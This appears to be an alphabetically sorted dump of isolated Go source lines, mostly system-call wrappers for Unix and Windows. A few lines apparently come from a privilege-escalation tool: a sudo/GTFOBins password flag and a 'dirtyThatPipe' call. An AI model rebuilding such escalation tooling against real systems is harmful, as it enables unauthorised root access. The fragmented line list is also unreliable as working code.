"procread,"
"procreadv)), 3, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(len(iovs)), 0, 0, 0)"
"procreadv,"
"procrecvfrom                                             = modws2_32.NewProc(""recvfrom"")"
"procrecvfrom)), 6, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(len(p)), uintptr(flags), uintptr(unsafe.Pointer(from)), uintptr(unsafe.Pointer(fromlen)))"
"procrecvfrom,"
"procsendfile)), 4, uintptr(outfd), uintptr(infd), uintptr(unsafe.Pointer(offset)), uintptr(count), 0, 0)"
"procsendfile,"
"procsendto                                               = modws2_32.NewProc(""sendto"")"
"procsetgroups)), 2, uintptr(ngid), uintptr(unsafe.Pointer(gid)), 0, 0, 0, 0)"
"procsetgroups,"
"procsetsockopt                                           = modws2_32.NewProc(""setsockopt"")"
"procsetsockopt)), 5, uintptr(s), uintptr(level), uintptr(name), uintptr(val), uintptr(vallen), 0)"
"procsetsockopt,"
"procshutdown                                             = modws2_32.NewProc(""shutdown"")"
"procshutdown)), 2, uintptr(s), uintptr(how), 0, 0, 0, 0)"
"procshutdown,"
"procsocket                                               = modws2_32.NewProc(""socket"")"
"procumount)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(flags), 0, 0, 0, 0)"
"procumount,"
"procutimensat)), 4, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(times)), uintptr(flag), 0, 0)"
"procutimensat,"
"procutimes)), 2, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(times)), 0, 0, 0, 0)"
"procutimes,"
"procwait4)), 4, uintptr(pid), uintptr(unsafe.Pointer(statusp)), uintptr(options), uintptr(unsafe.Pointer(rusage)), 0, 0)"
"procwait4,"
"procwrite)), 3, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(len(p)), 0, 0, 0)"
"procwrite)), 3, uintptr(fd), uintptr(unsafe.Pointer(buf)), uintptr(nbuf), 0, 0, 0)"
"procwrite,"
"procwritev)), 3, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(len(iovs)), 0, 0, 0)"
"procwritev,"
"promises, const char "
"prompt:       []rune(prompt),"
"promptForPassword, ""with-password"", ""p"", promptForPassword, ""Prompt for the user password, if you know it. Can provide more GTFOBins possibilities via sudo."")"
"propertyBuffers[0], uint32(len(propertyBuffers)))"
"proto, err := socketProtocol(fd)"
"provide your own, which will take precedence over the default one. (This also provides"
"ps := make([]portEvent, max, max)"
"ps[0], max, "
"ps[i], "
"pselect(int nd, fd_set "
"pset_assign(psetid_t psid, cpuid_t cpuid, psetid_t "
"ptmx, err := pty.Start(cmd)"
"ptmxfd, err := syscall.Open(""/dev/ptmx"", syscall.O_RDWR"
"pto),"
"ptr, err := LockResource(resData)"
"ptr, int count)"
"ptr, int value, int timeout)"
"ptr, l, err := to.sockaddr()"
"ptr, n, err := sa.sockaddr()"
"ptr, n, err := to.sockaddr()"
"ptr, salen, err = to.sockaddr()"
"ptrace(int req, pid_t pid, void "
"ptrace(request int, pid int, addr uintptr, data int) (err error)"
"ptrace(request int, pid int, addr uintptr, data uintptr) (err error)"
"ptrace1(request int, pid int, addr uintptr, data uintptr) (err error) = SYS_ptrace"
"ptsfd, err := syscall.Open(sname, os.O_RDWR"
"pty = os.NewFile(uintptr(ptm.Cfd), ""/dev/ptm"")"
"pty, tty, err := Open()"
"putmsg(fd int, clptr "
"pv.flagType = strings.TrimSuffix(t.Name(), ""Value"")"
"pw, ""password"", ""p"", """", ""Password (required if username is set)"")"
"pw, ""yaml"", false, ""Output in YAML"")"
"pwrite(fd int, p []byte, offset int64) (n int, err error) = SYS_PWRITE64"
"pwrite(fd int, p []byte, offset int64) (n int, err error) = pwrite64"
"pwrite(fd int, p []byte, offset int64) (n int, err error)"
"pwrite(int fd, const void "
"pwritev(fd int, iovs []Iovec, off int64) (n int, err error)"
"pwritev(fd int, iovs []Iovec, offs_l uintptr, offs_h uintptr) (n int, err error) = SYS_PWRITEV"
"pwritev(int fd, const struct iovec "
"pwritev2(fd int, iovs []Iovec, offs_l uintptr, offs_h uintptr, flags int) (n int, err error) = SYS_PWRITEV2"
"qs := make([]byte, n)"
"qs[j] = '""'"
"qsort(errors, nelem(errors), sizeof errors[0], intcmp)"
"qsort(errors, nelem(errors), sizeof errors[0], tuplecmp)"
"qsort(signals, nelem(signals), sizeof signals[0], intcmp)"
"qsort(signals, nelem(signals), sizeof signals[0], tuplecmp)"
"r := realGettimeofday(tv, nil)"
"r := realSyscallNoError(trap, a1, a2, a3, 0, 0, 0, 0, 0, 0)"
"r as end of line. So, on Windows, readPasswordLine"
"r', '"
"r, _ := GetStdHandle(stdhandle)"
"r, err := CapRightsInit(nil)"
"r, err = wait4(Pid_t(pid), "
"r, errno := realSyscall(trap, a1, a2, a3, 0, 0, 0, 0, 0, 0)"
"r, errno := realSyscall(trap, a1, a2, a3, a4, a5, a6, 0, 0, 0)"
"r, errno := realSyscall(trap, a1, a2, a3, a4, a5, a6, a7, a8, a9)"
"r, l := utf8.DecodeRune(b)"
"r, nil"
"r, rights)"
"r, w, err := pipe()"
"r, w, err := pipe2("
"r, w, err := v.dirtyThatPipe()"
"r, w, err = os.Pipe()"
"r.Rights[1] = capright(1, 0)"
"r.r = syscall(trap, a1, a2, a3, a4, a5, a6, a7, a8, a9)"
"r0, _ := C.getegid()"
"r0, _ := C.geteuid()"
"r0, _ := C.getgid()"
"r0, _ := C.getpgrp()"
"r0, _ := C.getpid()"
"r0, _ := C.getppid()"
"r0, _ := C.getsystemcfg(C.int(label))"
"r0, _ := C.getuid()"
"r0, _ := C.umask(C.int(mask))"
"r0, _ := RawSyscallNoError(SYS_GETEGID, 0, 0, 0)"
"r0, _ := RawSyscallNoError(SYS_GETEGID32, 0, 0, 0)"
"r0, _ := RawSyscallNoError(SYS_GETEUID, 0, 0, 0)"
"r0, _ := RawSyscallNoError(SYS_GETEUID32, 0, 0, 0)"
"r0, _ := RawSyscallNoError(SYS_GETGID, 0, 0, 0)"
"r0, _ := RawSyscallNoError(SYS_GETGID32, 0, 0, 0)"
"r0, _ := RawSyscallNoError(SYS_GETPID, 0, 0, 0)"
"r0, _ := RawSyscallNoError(SYS_GETPPID, 0, 0, 0)"
"r0, _ := RawSyscallNoError(SYS_GETTID, 0, 0, 0)"
"r0, _ := RawSyscallNoError(SYS_GETUID, 0, 0, 0)"
"r0, _ := RawSyscallNoError(SYS_GETUID32, 0, 0, 0)"
"r0, _ := RawSyscallNoError(SYS_UMASK, uintptr(mask), 0, 0)"
"r0, _ := callgetegid()"
"r0, _ := callgeteuid()"
"r0, _ := callgetgid()"
"r0, _ := callgetpgrp()"
"r0, _ := callgetpid()"
"r0, _ := callgetppid()"
"r0, _ := callgetsystemcfg(label)"
"r0, _ := callgetuid()"
"r0, _ := callumask(mask)"
"r0, _, _ := RawSyscall(SYS_GETEGID, 0, 0, 0)"
"r0, _, _ := RawSyscall(SYS_GETEUID, 0, 0, 0)"
"r0, _, _ := RawSyscall(SYS_GETGID, 0, 0, 0)"
"r0, _, _ := RawSyscall(SYS_GETPGRP, 0, 0, 0)"
"r0, _, _ := RawSyscall(SYS_GETPID, 0, 0, 0)"
"r0, _, _ := RawSyscall(SYS_GETPPID, 0, 0, 0)"
"r0, _, _ := RawSyscall(SYS_GETUID, 0, 0, 0)"
"r0, _, _ := Syscall(SYS_GETDTABLESIZE, 0, 0, 0)"
"r0, _, _ := Syscall(SYS_ISSETUGID, 0, 0, 0)"
"r0, _, _ := Syscall(SYS_NSEC, uintptr(unsafe.Pointer("
"r0, _, _ := Syscall(SYS_UMASK, uintptr(newmask), 0, 0)"
"r0, _, _ := rawSysvicall6(uintptr(unsafe.Pointer("
"r0, _, _ := syscall.Syscall(procCLSIDFromString.Addr(), 2, uintptr(unsafe.Pointer(lpsz)), uintptr(unsafe.Pointer(pclsid)), 0)"
"r0, _, _ := syscall.Syscall(procCM_MapCrToWin32Err.Addr(), 2, uintptr(configRet), uintptr(defaultWin32Error), 0)"
"r0, _, _ := syscall.Syscall(procCertDuplicateCertificateContext.Addr(), 1, uintptr(unsafe.Pointer(certContext)), 0, 0)"
"r0, _, _ := syscall.Syscall(procCertFindExtension.Addr(), 3, uintptr(unsafe.Pointer(objId)), uintptr(countExtensions), uintptr(unsafe.Pointer(extensions)))"
"r0, _, _ := syscall.Syscall(procCoCreateGuid.Addr(), 1, uintptr(unsafe.Pointer(pguid)), 0, 0)"
"r0, _, _ := syscall.Syscall(procCoInitializeEx.Addr(), 2, uintptr(reserved), uintptr(coInit), 0)"
"r0, _, _ := syscall.Syscall(procDnsNameCompare_W.Addr(), 2, uintptr(unsafe.Pointer(name1)), uintptr(unsafe.Pointer(name2)), 0)"
"r0, _, _ := syscall.Syscall(procEqualSid.Addr(), 2, uintptr(unsafe.Pointer(sid1)), uintptr(unsafe.Pointer(sid2)), 0)"
"r0, _, _ := syscall.Syscall(procGetACP.Addr(), 0, 0, 0, 0)"
"r0, _, _ := syscall.Syscall(procGetActiveProcessorCount.Addr(), 1, uintptr(groupNumber), 0, 0)"
"r0, _, _ := syscall.Syscall(procGetAdaptersInfo.Addr(), 2, uintptr(unsafe.Pointer(ai)), uintptr(unsafe.Pointer(ol)), 0)"
"r0, _, _ := syscall.Syscall(procGetCommandLineW.Addr(), 0, 0, 0, 0)"
"r0, _, _ := syscall.Syscall(procGetCurrentProcessId.Addr(), 0, 0, 0, 0)"
"r0, _, _ := syscall.Syscall(procGetCurrentThreadId.Addr(), 0, 0, 0, 0)"
"r0, _, _ := syscall.Syscall(procGetDriveTypeW.Addr(), 1, uintptr(unsafe.Pointer(rootPathName)), 0, 0)"
"r0, _, _ := syscall.Syscall(procGetIfEntry.Addr(), 1, uintptr(unsafe.Pointer(pIfRow)), 0, 0)"
"r0, _, _ := syscall.Syscall(procGetLastError.Addr(), 0, 0, 0, 0)"
"r0, _, _ := syscall.Syscall(procGetLengthSid.Addr(), 1, uintptr(unsafe.Pointer(sid)), 0, 0)"
"r0, _, _ := syscall.Syscall(procGetMaximumProcessorCount.Addr(), 1, uintptr(groupNumber), 0, 0)"
"r0, _, _ := syscall.Syscall(procGetSecurityDescriptorLength.Addr(), 1, uintptr(unsafe.Pointer(sd)), 0, 0)"
"r0, _, _ := syscall.Syscall(procGetSecurityDescriptorRMControl.Addr(), 2, uintptr(unsafe.Pointer(sd)), uintptr(unsafe.Pointer(rmControl)), 0)"
"r0, _, _ := syscall.Syscall(procGetShellWindow.Addr(), 0, 0, 0, 0)"
"r0, _, _ := syscall.Syscall(procGetSidIdentifierAuthority.Addr(), 1, uintptr(unsafe.Pointer(sid)), 0, 0)"
"r0, _, _ := syscall.Syscall(procGetSidSubAuthority.Addr(), 2, uintptr(unsafe.Pointer(sid)), uintptr(index), 0)"
"r0, _, _ := syscall.Syscall(procGetSidSubAuthorityCount.Addr(), 1, uintptr(unsafe.Pointer(sid)), 0, 0)"
"r0, _, _ := syscall.Syscall(procGetTickCount64.Addr(), 0, 0, 0, 0)"
"r0, _, _ := syscall.Syscall(procIsValidSecurityDescriptor.Addr(), 1, uintptr(unsafe.Pointer(sd)), 0, 0)"
"r0, _, _ := syscall.Syscall(procIsValidSid.Addr(), 1, uintptr(unsafe.Pointer(sid)), 0, 0)"
"r0, _, _ := syscall.Syscall(procIsWellKnownSid.Addr(), 2, uintptr(unsafe.Pointer(sid)), uintptr(sidType), 0)"
"r0, _, _ := syscall.Syscall(procNetApiBufferFree.Addr(), 1, uintptr(unsafe.Pointer(buf)), 0, 0)"
"r0, _, _ := syscall.Syscall(procNetGetJoinInformation.Addr(), 3, uintptr(unsafe.Pointer(server)), uintptr(unsafe.Pointer(name)), uintptr(unsafe.Pointer(bufType)))"
"r0, _, _ := syscall.Syscall(procNotifyServiceStatusChangeW.Addr(), 3, uintptr(service), uintptr(notifyMask), uintptr(unsafe.Pointer(notifier)))"
"r0, _, _ := syscall.Syscall(procNtSetSystemInformation.Addr(), 3, uintptr(sysInfoClass), uintptr(sysInfo), uintptr(sysInfoLen))"
"r0, _, _ := syscall.Syscall(procRegCloseKey.Addr(), 1, uintptr(key), 0, 0)"
"r0, _, _ := syscall.Syscall(procRtlAddFunctionTable.Addr(), 3, uintptr(unsafe.Pointer(functionTable)), uintptr(entryCount), uintptr(baseAddress))"
"r0, _, _ := syscall.Syscall(procRtlDefaultNpAcl.Addr(), 1, uintptr(unsafe.Pointer(acl)), 0, 0)"
"r0, _, _ := syscall.Syscall(procRtlDeleteFunctionTable.Addr(), 1, uintptr(unsafe.Pointer(functionTable)), 0, 0)"
"r0, _, _ := syscall.Syscall(procRtlGetCurrentPeb.Addr(), 0, 0, 0, 0)"
"r0, _, _ := syscall.Syscall(procRtlGetVersion.Addr(), 1, uintptr(unsafe.Pointer(info)), 0, 0)"
"r0, _, _ := syscall.Syscall(procRtlNtStatusToDosErrorNoTeb.Addr(), 1, uintptr(ntstatus), 0, 0)"
"r0, _, _ := syscall.Syscall(procSetErrorMode.Addr(), 1, uintptr(mode), 0, 0)"
"r0, _, _ := syscall.Syscall(procSleepEx.Addr(), 2, uintptr(milliseconds), uintptr(_p0), 0)"
"r0, _, _ := syscall.Syscall(procStringFromGUID2.Addr(), 3, uintptr(unsafe.Pointer(rguid)), uintptr(unsafe.Pointer(lpsz)), uintptr(cchMax))"
"r0, _, _ := syscall.Syscall(procWSAStartup.Addr(), 2, uintptr(verreq), uintptr(unsafe.Pointer(data)), 0)"
"r0, _, _ := syscall.Syscall(procWTSGetActiveConsoleSessionId.Addr(), 0, 0, 0, 0)"
"r0, _, _ := syscall.Syscall(procWinVerifyTrustEx.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(actionId)), uintptr(unsafe.Pointer(data)))"
"r0, _, _ := syscall.Syscall(procntohs.Addr(), 1, uintptr(netshort), 0, 0)"
"r0, _, _ := syscall.Syscall12(procNtCreateFile.Addr(), 11, uintptr(unsafe.Pointer(handle)), uintptr(access), uintptr(unsafe.Pointer(oa)), uintptr(unsafe.Pointer(iosb)), uintptr(unsafe.Pointer(allocationSize)), uintptr(attributes), uintptr(share), uintptr(disposition), uintptr(options), uintptr(eabuffer), uintptr(ealength), 0)"
"r0, _, _ := syscall.Syscall12(procRegQueryInfoKeyW.Addr(), 12, uintptr(key), uintptr(unsafe.Pointer(class)), uintptr(unsafe.Pointer(classLen)), uintptr(unsafe.Pointer(reserved)), uintptr(unsafe.Pointer(subkeysLen)), uintptr(unsafe.Pointer(maxSubkeyLen)), uintptr(unsafe.Pointer(maxClassLen)), uintptr(unsafe.Pointer(valuesLen)), uintptr(unsafe.Pointer(maxValueNameLen)), uintptr(unsafe.Pointer(maxValueLen)), uintptr(unsafe.Pointer(saLen)), uintptr(unsafe.Pointer(lastWriteTime)))"
"r0, _, _ := syscall.Syscall15(procNtCreateNamedPipeFile.Addr(), 14, uintptr(unsafe.Pointer(pipe)), uintptr(access), uintptr(unsafe.Pointer(oa)), uintptr(unsafe.Pointer(iosb)), uintptr(share), uintptr(disposition), uintptr(options), uintptr(typ), uintptr(readMode), uintptr(completionMode), uintptr(maxInstances), uintptr(inboundQuota), uintptr(outputQuota), uintptr(unsafe.Pointer(timeout)), 0)"
"r0, _, _ := syscall.Syscall6(procCM_Get_DevNode_Status.Addr(), 4, uintptr(unsafe.Pointer(status)), uintptr(unsafe.Pointer(problemNumber)), uintptr(devInst), uintptr(flags), 0, 0)"
"r0, _, _ := syscall.Syscall6(procCM_Get_Device_Interface_ListW.Addr(), 5, uintptr(unsafe.Pointer(interfaceClass)), uintptr(unsafe.Pointer(deviceID)), uintptr(unsafe.Pointer(buffer)), uintptr(bufferLen), uintptr(flags), 0)"
"r0, _, _ := syscall.Syscall6(procCM_Get_Device_Interface_List_SizeW.Addr(), 4, uintptr(unsafe.Pointer(len)), uintptr(unsafe.Pointer(interfaceClass)), uintptr(unsafe.Pointer(deviceID)), uintptr(flags), 0, 0)"
"r0, _, _ := syscall.Syscall6(procCertGetNameStringW.Addr(), 6, uintptr(unsafe.Pointer(certContext)), uintptr(nameType), uintptr(flags), uintptr(typePara), uintptr(unsafe.Pointer(name)), uintptr(size))"
"r0, _, _ := syscall.Syscall6(procCoGetObject.Addr(), 4, uintptr(unsafe.Pointer(name)), uintptr(unsafe.Pointer(bindOpts)), uintptr(unsafe.Pointer(guid)), uintptr(unsafe.Pointer(functionTable)), 0, 0)"
"r0, _, _ := syscall.Syscall6(procDnsQuery_W.Addr(), 6, uintptr(unsafe.Pointer(name)), uintptr(qtype), uintptr(options), uintptr(unsafe.Pointer(extra)), uintptr(unsafe.Pointer(qrs)), uintptr(unsafe.Pointer(pr)))"
"r0, _, _ := syscall.Syscall6(procGetAdaptersAddresses.Addr(), 5, uintptr(family), uintptr(flags), uintptr(reserved), uintptr(unsafe.Pointer(adapterAddresses)), uintptr(unsafe.Pointer(sizePointer)), 0)"
"r0, _, _ := syscall.Syscall6(procGetAddrInfoW.Addr(), 4, uintptr(unsafe.Pointer(nodename)), uintptr(unsafe.Pointer(servicename)), uintptr(unsafe.Pointer(hints)), uintptr(unsafe.Pointer(result)), 0, 0)"
"r0, _, _ := syscall.Syscall6(procNetUserGetInfo.Addr(), 4, uintptr(unsafe.Pointer(serverName)), uintptr(unsafe.Pointer(userName)), uintptr(level), uintptr(unsafe.Pointer(buf)), 0, 0)"
"r0, _, _ := syscall.Syscall6(procNtQueryInformationProcess.Addr(), 5, uintptr(proc), uintptr(procInfoClass), uintptr(procInfo), uintptr(procInfoLen), uintptr(unsafe.Pointer(retLen)), 0)"
"r0, _, _ := syscall.Syscall6(procNtQuerySystemInformation.Addr(), 4, uintptr(sysInfoClass), uintptr(sysInfo), uintptr(sysInfoLen), uintptr(unsafe.Pointer(retLen)), 0, 0)"
"r0, _, _ := syscall.Syscall6(procNtSetInformationFile.Addr(), 5, uintptr(handle), uintptr(unsafe.Pointer(iosb)), uintptr(unsafe.Pointer(inBuffer)), uintptr(inBufferLen), uintptr(class), 0)"
"r0, _, _ := syscall.Syscall6(procNtSetInformationProcess.Addr(), 4, uintptr(proc), uintptr(procInfoClass), uintptr(procInfo), uintptr(procInfoLen), 0, 0)"
"r0, _, _ := syscall.Syscall6(procRegNotifyChangeKeyValue.Addr(), 5, uintptr(key), uintptr(_p0), uintptr(notifyFilter), uintptr(event), uintptr(_p1), 0)"
"r0, _, _ := syscall.Syscall6(procRegOpenKeyExW.Addr(), 5, uintptr(key), uintptr(unsafe.Pointer(subkey)), uintptr(options), uintptr(desiredAccess), uintptr(unsafe.Pointer(result)), 0)"
"r0, _, _ := syscall.Syscall6(procRegQueryValueExW.Addr(), 6, uintptr(key), uintptr(unsafe.Pointer(name)), uintptr(unsafe.Pointer(reserved)), uintptr(unsafe.Pointer(valtype)), uintptr(unsafe.Pointer(buf)), uintptr(unsafe.Pointer(buflen)))"
"r0, _, _ := syscall.Syscall6(procRtlDosPathNameToNtPathName_U_WithStatus.Addr(), 4, uintptr(unsafe.Pointer(dosName)), uintptr(unsafe.Pointer(ntName)), uintptr(unsafe.Pointer(ntFileNamePart)), uintptr(unsafe.Pointer(relativeName)), 0, 0)"
"r0, _, _ := syscall.Syscall6(procRtlDosPathNameToRelativeNtPathName_U_WithStatus.Addr(), 4, uintptr(unsafe.Pointer(dosName)), uintptr(unsafe.Pointer(ntName)), uintptr(unsafe.Pointer(ntFileNamePart)), uintptr(unsafe.Pointer(relativeName)), 0, 0)"
"r0, _, _ := syscall.Syscall6(procSHGetKnownFolderPath.Addr(), 4, uintptr(unsafe.Pointer(id)), uintptr(flags), uintptr(token), uintptr(unsafe.Pointer(path)), 0, 0)"
"r0, _, _ := syscall.Syscall6(procSetEntriesInAclW.Addr(), 4, uintptr(countExplicitEntries), uintptr(unsafe.Pointer(explicitEntries)), uintptr(unsafe.Pointer(oldACL)), uintptr(unsafe.Pointer(newACL)), 0, 0)"
"r0, _, _ := syscall.Syscall6(procSubscribeServiceChangeNotifications.Addr(), 5, uintptr(service), uintptr(eventType), uintptr(callback), uintptr(callbackCtx), uintptr(unsafe.Pointer(subscription)), 0)"
"r0, _, _ := syscall.Syscall9(procBuildSecurityDescriptorW.Addr(), 9, uintptr(unsafe.Pointer(owner)), uintptr(unsafe.Pointer(group)), uintptr(countAccessEntries), uintptr(unsafe.Pointer(accessEntries)), uintptr(countAuditEntries), uintptr(unsafe.Pointer(auditEntries)), uintptr(unsafe.Pointer(oldSecurityDescriptor)), uintptr(unsafe.Pointer(sizeNewSecurityDescriptor)), uintptr(unsafe.Pointer(newSecurityDescriptor)))"
"r0, _, _ := syscall.Syscall9(procGetNamedSecurityInfoW.Addr(), 8, uintptr(unsafe.Pointer(objectName)), uintptr(objectType), uintptr(securityInformation), uintptr(unsafe.Pointer(owner)), uintptr(unsafe.Pointer(group)), uintptr(unsafe.Pointer(dacl)), uintptr(unsafe.Pointer(sacl)), uintptr(unsafe.Pointer(sd)), 0)"
"r0, _, _ := syscall.Syscall9(procGetSecurityInfo.Addr(), 8, uintptr(handle), uintptr(objectType), uintptr(securityInformation), uintptr(unsafe.Pointer(owner)), uintptr(unsafe.Pointer(group)), uintptr(unsafe.Pointer(dacl)), uintptr(unsafe.Pointer(sacl)), uintptr(unsafe.Pointer(sd)), 0)"
"r0, _, _ := syscall.Syscall9(procRegEnumKeyExW.Addr(), 8, uintptr(key), uintptr(index), uintptr(unsafe.Pointer(name)), uintptr(unsafe.Pointer(nameLen)), uintptr(unsafe.Pointer(reserved)), uintptr(unsafe.Pointer(class)), uintptr(unsafe.Pointer(classLen)), uintptr(unsafe.Pointer(lastWriteTime)), 0)"
"r0, _, _ := syscall.Syscall9(procSetNamedSecurityInfoW.Addr(), 7, uintptr(unsafe.Pointer(objectName)), uintptr(objectType), uintptr(securityInformation), uintptr(unsafe.Pointer(owner)), uintptr(unsafe.Pointer(group)), uintptr(unsafe.Pointer(dacl)), uintptr(unsafe.Pointer(sacl)), 0, 0)"
"r0, _, _ := syscall.Syscall9(procSetSecurityInfo.Addr(), 7, uintptr(handle), uintptr(objectType), uintptr(securityInformation), uintptr(unsafe.Pointer(owner)), uintptr(unsafe.Pointer(group)), uintptr(unsafe.Pointer(dacl)), uintptr(unsafe.Pointer(sacl)), 0, 0)"
"r0, _, _ := syscall_rawSyscall(libc_getegid_trampoline_addr, 0, 0, 0)"
"r0, _, _ := syscall_rawSyscall(libc_geteuid_trampoline_addr, 0, 0, 0)"
"r0, _, _ := syscall_rawSyscall(libc_getgid_trampoline_addr, 0, 0, 0)"
"r0, _, _ := syscall_rawSyscall(libc_getpgrp_trampoline_addr, 0, 0, 0)"
"r0, _, _ := syscall_rawSyscall(libc_getpid_trampoline_addr, 0, 0, 0)"
"r0, _, _ := syscall_rawSyscall(libc_getppid_trampoline_addr, 0, 0, 0)"
"r0, _, _ := syscall_rawSyscall(libc_getuid_trampoline_addr, 0, 0, 0)"
"r0, _, _ := syscall_rawSyscall(libc_issetugid_trampoline_addr, 0, 0, 0)"
"r0, _, _ := syscall_rawsyscall(SYS_GETEGID, 0, 0, 0)"
"r0, _, _ := syscall_rawsyscall(SYS_GETEUID, 0, 0, 0)"
"r0, _, _ := syscall_rawsyscall(SYS_GETGID, 0, 0, 0)"
"r0, _, _ := syscall_rawsyscall(SYS_GETPID, 0, 0, 0)"
"r0, _, _ := syscall_rawsyscall(SYS_GETPPID, 0, 0, 0)"
"r0, _, _ := syscall_rawsyscall(SYS_GETUID, 0, 0, 0)"
"r0, _, _ := syscall_syscall(SYS_GETPAGESIZE, 0, 0, 0)"
"r0, _, _ := syscall_syscall(SYS_UMASK, uintptr(mask), 0, 0)"
"r0, _, _ := syscall_syscall(libc_getdtablesize_trampoline_addr, 0, 0, 0)"
"r0, _, _ := syscall_syscall(libc_readdir_r_trampoline_addr, uintptr(dir), uintptr(unsafe.Pointer(entry)), uintptr(unsafe.Pointer(result)))"
"r0, _, _ := syscall_syscall(libc_umask_trampoline_addr, uintptr(newmask), 0, 0)"
"r0, _, _ := sysvicall6(uintptr(unsafe.Pointer("
"r0, _, e = Syscall(SYS_UNMOUNT, _zero, oldptr, 0)"
"r0, _, e = Syscall(SYS_UNMOUNT, uintptr(unsafe.Pointer(namep)), oldptr, 0)"
"r0, _, e1 := RawSyscall(SYS_EPOLL_CREATE1, uintptr(flag), 0, 0)"
"r0, _, e1 := RawSyscall(SYS_GETGROUPS, uintptr(n), uintptr(unsafe.Pointer(list)), 0)"
"r0, _, e1 := RawSyscall(SYS_GETGROUPS, uintptr(ngid), uintptr(unsafe.Pointer(gid)), 0)"
"r0, _, e1 := RawSyscall(SYS_GETGROUPS32, uintptr(n), uintptr(unsafe.Pointer(list)), 0)"
"r0, _, e1 := RawSyscall(SYS_GETPGID, uintptr(pid), 0, 0)"
"r0, _, e1 := RawSyscall(SYS_GETRTABLE, 0, 0, 0)"
"r0, _, e1 := RawSyscall(SYS_GETSID, uintptr(pid), 0, 0)"
"r0, _, e1 := RawSyscall(SYS_INOTIFY_INIT1, uintptr(flags), 0, 0)"
"r0, _, e1 := RawSyscall(SYS_INOTIFY_RM_WATCH, uintptr(fd), uintptr(watchdesc), 0)"
"r0, _, e1 := RawSyscall(SYS_SETSID, 0, 0, 0)"
"r0, _, e1 := RawSyscall(SYS_SOCKET, uintptr(domain), uintptr(typ), uintptr(proto))"
"r0, _, e1 := RawSyscall(SYS_TIME, uintptr(unsafe.Pointer(t)), 0, 0)"
"r0, _, e1 := RawSyscall(SYS_TIMERFD_CREATE, uintptr(clockid), uintptr(flags), 0)"
"r0, _, e1 := RawSyscall(SYS_TIMES, uintptr(unsafe.Pointer(tms)), 0, 0)"
"r0, _, e1 := Syscall(SYS_ACCEPT, uintptr(s), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)))"
"r0, _, e1 := Syscall(SYS_ADJTIMEX, uintptr(unsafe.Pointer(buf)), 0, 0)"
"r0, _, e1 := Syscall(SYS_ALARM, uintptr(seconds), 0, 0)"
"r0, _, e1 := Syscall(SYS_AWAIT, uintptr(_p0), uintptr(len(s)), 0)"
"r0, _, e1 := Syscall(SYS_BIND, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), uintptr(flag))"
"r0, _, e1 := Syscall(SYS_CHDIR, uintptr(unsafe.Pointer(_p0)), 0, 0)"
"r0, _, e1 := Syscall(SYS_CLOSE, uintptr(fd), 0, 0)"
"r0, _, e1 := Syscall(SYS_CREATE, uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(perm))"
"r0, _, e1 := Syscall(SYS_DUP, uintptr(fd), 0, 0)"
"r0, _, e1 := Syscall(SYS_DUP, uintptr(oldfd), 0, 0)"
"r0, _, e1 := Syscall(SYS_DUP, uintptr(oldfd), uintptr(newfd), 0)"
"r0, _, e1 := Syscall(SYS_EVENTFD2, uintptr(initval), uintptr(flags), 0)"
"r0, _, e1 := Syscall(SYS_FANOTIFY_INIT, uintptr(flags), uintptr(event_f_flags), 0)"
"r0, _, e1 := Syscall(SYS_FD2PATH, uintptr(fd), uintptr(_p0), uintptr(len(buf)))"
"r0, _, e1 := Syscall(SYS_FLISTXATTR, uintptr(fd), uintptr(_p0), uintptr(len(dest)))"
"r0, _, e1 := Syscall(SYS_FPATHCONF, uintptr(fd), uintptr(name), 0)"
"r0, _, e1 := Syscall(SYS_FSMOUNT, uintptr(fd), uintptr(flags), uintptr(mountAttrs))"
"r0, _, e1 := Syscall(SYS_FSOPEN, uintptr(unsafe.Pointer(_p0)), uintptr(flags), 0)"
"r0, _, e1 := Syscall(SYS_FSPICK, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(flags))"
"r0, _, e1 := Syscall(SYS_FSTAT, uintptr(fd), uintptr(_p0), uintptr(len(edir)))"
"r0, _, e1 := Syscall(SYS_FWSTAT, uintptr(fd), uintptr(_p0), uintptr(len(edir)))"
"r0, _, e1 := Syscall(SYS_GETCWD, uintptr(_p0), uintptr(len(buf)), 0)"
"r0, _, e1 := Syscall(SYS_GETDENTS, uintptr(fd), uintptr(_p0), uintptr(len(buf)))"
"r0, _, e1 := Syscall(SYS_GETDENTS64, uintptr(fd), uintptr(_p0), uintptr(len(buf)))"
"r0, _, e1 := Syscall(SYS_GETFSSTAT, uintptr(_p0), bufsize, uintptr(flags))"
"r0, _, e1 := Syscall(SYS_GETPRIORITY, uintptr(which), uintptr(who), 0)"
"r0, _, e1 := Syscall(SYS_GETRANDOM, uintptr(_p0), uintptr(len(buf)), uintptr(flags))"
"r0, _, e1 := Syscall(SYS_INOTIFY_ADD_WATCH, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(mask))"
"r0, _, e1 := Syscall(SYS_KEYCTL, uintptr(cmd), uintptr(unsafe.Pointer(_p0)), 0)"
"r0, _, e1 := Syscall(SYS_KQUEUE, 0, 0, 0)"
"r0, _, e1 := Syscall(SYS_LISTXATTR, uintptr(unsafe.Pointer(_p0)), uintptr(_p1), uintptr(len(dest)))"
"r0, _, e1 := Syscall(SYS_LLISTXATTR, uintptr(unsafe.Pointer(_p0)), uintptr(_p1), uintptr(len(dest)))"
"r0, _, e1 := Syscall(SYS_LSEEK, uintptr(fd), uintptr(offset), uintptr(whence))"
"r0, _, e1 := Syscall(SYS_MEMFD_CREATE, uintptr(unsafe.Pointer(_p0)), uintptr(flags), 0)"
"r0, _, e1 := Syscall(SYS_MEMFD_SECRET, uintptr(flags), 0, 0)"
"r0, _, e1 := Syscall(SYS_MMAP, uintptr(unsafe.Pointer("
"r0, _, e1 := Syscall(SYS_OPEN, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0)"
